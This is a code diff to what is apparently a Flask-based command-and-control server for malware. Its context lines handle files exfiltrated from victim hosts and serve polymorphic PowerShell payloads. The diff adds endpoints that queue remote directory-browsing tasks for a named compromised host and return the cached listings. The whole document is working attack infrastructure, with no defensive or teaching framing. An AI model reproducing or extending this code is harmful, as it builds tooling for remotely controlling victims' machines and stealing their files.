@@ -252,7 +252,14 @@ def result():
             print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
         except Exception as ex:
             print(f"[!] Failed to process exfil file: {ex}")
-
+    
+    if command.startswith("browse "):
+        try:
+            browse_json = json.loads(result)
+            browse_results[hostname] = browse_json  # Cache for quick access
+        except Exception:
+            pass  # If result is not valid JSON, skip caching
+   
     # Store result in database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -352,6 +359,30 @@ def generate_ps_payload():
     from tools.ps_builder import generate_polymorphic_ps
     filename = generate_polymorphic_ps()
     return send_from_directory('payloads', filename)
+
+browse_results = {}
+
+@app.route('/api/browse', methods=['POST'])
+def browse_task():
+    data = request.json
+    hostname = data['hostname']
+    path = data.get('path', 'C:\\' if os.name == 'nt' else '/')
+    # Insert task as you do in /add_task, e.g.:
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, ?)", (hostname, f"browse {path}", "pending"))
+    conn.commit()
+    conn.close()
+
+    return jsonify({"status": "queued"})
+
+@app.route('/api/browse_result/<hostname>')
+def get_browse_result(hostname):
+    # In-memory example:
+    res = browse_results.get(hostname)
+    if res:
+        return jsonify(res)
+    return jsonify({"error": "No browse result for this host."}), 404
 
 
 @socketio.on('connect')
